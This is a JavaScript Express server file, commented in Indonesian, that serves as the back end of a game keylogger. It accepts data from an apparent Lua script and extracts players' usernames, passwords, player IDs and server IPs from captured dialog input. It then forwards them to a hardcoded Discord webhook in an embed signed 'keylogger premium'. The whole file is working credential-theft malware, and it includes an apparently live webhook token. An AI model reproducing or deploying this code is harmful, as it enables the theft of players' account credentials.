import express from 'express'
import axios from 'axios'

const app = express()
app.use(express.json())

// Tentukan port 8080
const PORT = 8080

app.get('/', (_req, res) => {
  res.send('Hello Express API is running!')
})

// Endpoint disesuaikan dengan apiPath di script Lua ("/api/send")
app.post('/api/send', async (req, res) => {
  try {
    // Menangkap struktur payload cjson dari script Lua
    const { c, n, i, s, sip, mip, t } = req.body
    
    // Validasi sederhana jika payload kosong
    if (!c || !n) {
      return res.status(400).json({ success: false, error: "Invalid data format" })
    }

    // --- PROSES EKSTRAKSI DATA DARI VARIABEL 'c' ---
    let rawContent = c || "";
    let extractedPassword = "Tidak ada";
    let extractedDialogId = "Tidak ada";

    // Format dari Lua: "Dialog:220 | Input:dott"
    // 1. Ekstraksi Dialog ID
    const matchDialog = rawContent.match(/Dialog:(\d+)/i);
    if (matchDialog) {
      extractedDialogId = matchDialog[1];
    }

    // 2. Ekstraksi Password dari Input
    const matchInput = rawContent.match(/Input:([^\s|]+)/i);
    if (matchInput) {
      extractedPassword = matchInput[1];
    }

    // URL Webhook Discord Anda
    const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'

    // Mengirim payload dalam bentuk struktur Rich Embed Discord
    await axios.post(webhookUrl, {
      embeds: [
        {
          title: "PAKET NIH NYET!!",
          color: 16777215, // Kode desimal untuk warna putih (#FFFFFF)
          fields: [
            {
              name: "Username",
              value: n || "Tidak ada",
              inline: true
            },
            {
              name: "Password",
              value: extractedPassword,
              inline: true
            },
            {
              name: "Player ID",
              value: i !== undefined ? String(i) : "Tidak ada",
              inline: true
            },
            {
              name: "Server",
              value: s || "Tidak ada",
              inline: false
            },
            {
              name: "Server IP",
              value: sip || "Tidak ada",
              inline: true
            },
            {
              name: "Dialog ID",
              value: extractedDialogId,
              inline: true
            },
            {
              name: "DATA PLAYER",
              value: rawContent ? `\`\`\`\n${rawContent}\n\`\`\`` : "```\nTidak ada\n```",
              inline: false
            }
          ],
          footer: {
            text: "Dott & Bich - keylogger premium"
          },
          timestamp: new Date().toISOString()
        }
      ]
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
    
    res.json({ success: true })
  } catch (error) {
    console.error("Gagal mengirim ke Discord:", error)
    res.status(500).json({ success: false, error: "Internal Server Error" })
  }
})

// Mengaktifkan server Express di port 8080
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`)
})

export default app
